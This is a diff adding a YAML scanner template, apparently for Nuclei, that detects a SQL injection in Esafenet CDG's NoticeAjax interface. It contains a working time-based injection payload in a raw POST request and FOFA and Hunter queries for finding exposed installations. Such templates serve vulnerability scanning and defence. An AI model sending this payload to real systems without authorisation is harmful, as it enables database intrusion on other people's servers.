@@ -1,0 +1,41 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - contains(content_type,"text/xml")
+    - contains(body,"OK")
+    - status_code == 200
+    type: dsl
+  raw:
+  - '@timeout: 10s
+
+    POST /CDGServer3/NoticeAjax;Service HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    command=delNotice&noticeId=123'';if+(select+IS_SRVROLEMEMBER(''sysadmin''))=1+WAITFOR+DELAY+''0:0:5''--
+
+    '
+id: esafenet-noticeajax-sqli
+info:
+  author: adeljck
+  description: 'CDGServer3 NoticeAjax Interface Sql Injection.
+
+    '
+  metadata:
+    fofa-query: "title=\"\u7535\u5B50\u6587\u6863\u5B89\u5168\u7BA1\u7406\u7CFB\u7EDF\
+      \",body=\"CDGServer3/\""
+    hunter-query: "web.title=\"\u7535\u5B50\u6587\u6863\u5B89\u5168\u7BA1\u7406\u7CFB\
+      \u7EDF\",web.body=\"CDGServer3/\""
+    max-request: 1
+    product: electronic_document_security_management_system
+    vendor: esafenet
+    verified: true
+  name: Esafenet CDG NoticeAjax - Sql Injection
+  severity: high
+  tags: esafenet,sqli
